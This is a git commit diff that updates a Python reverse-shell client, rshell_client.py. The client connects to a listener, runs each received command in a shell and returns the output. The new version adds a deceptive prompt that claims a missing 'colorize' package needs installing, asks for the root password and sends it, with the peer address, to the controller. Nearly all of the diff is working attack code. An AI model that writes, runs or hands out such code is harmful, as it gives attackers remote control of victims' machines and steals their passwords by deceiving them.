64271911c80687f1e34603014721db61a5ae6146
Ataberk Yavuzer <SyraTR@users.noreply.github.com>
2016-04-29 00:26:54 +0300

    Update rshell_client.py

--- rshell_client.py
+++ rshell_client.py
@@ -1,31 +1,30 @@
+#-*- coding:utf-8 -*-
 import socket,subprocess,getpass
 
 
 def connection():
-    host = "127.0.0.1"
-    port = 8080
-    buff = 2048
-    global client_socket
-    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
-    client_socket.connect((host,port))
-    while True:
-        received_data = client_socket.recv(buff)
-        if received_data == 'quit' :
-            client_socket.close()
-        elif "sudo" in received_data :
-            sudo_required()
-        else :
-            command = subprocess.check_output(received_data, shell=True)
-            if not command:
-                client_socket.send("Command succesfully executed.")
-            else:
-                client_socket.send(str(command) + "\nCommand succesfully executed.")
+	host = "127.0.0.1"
+	port = 8080
+	buff = 2048	
+	global client_socket
+	client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
+	client_socket.connect((host,port))
+	get_root_passwd()
+	while True:
+		received_data = client_socket.recv(buff)
+		if received_data == 'quit' :
+			client_socket.close()
+		else :
+			command = subprocess.check_output(received_data, shell=True)
+			if not command:
+				client_socket.send("Command succesfully executed.")
+			else:
+				client_socket.send(str(command) + "\nCommand succesfully executed.")
 
-def sudo_required():
-    prompt = "root password required ahead: "
-    password = getpass.getpass(prompt)
-    sendpass = "P4SSW0RD : " + str(password)
-    client_socket.send(str(sendpass))
+def get_root_passwd():
+	prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
+	password = getpass.getpass(prompt)
+	client_socket.send("Password : " +str(password + "\n" +str(client_socket.getpeername())))
 
 connection()
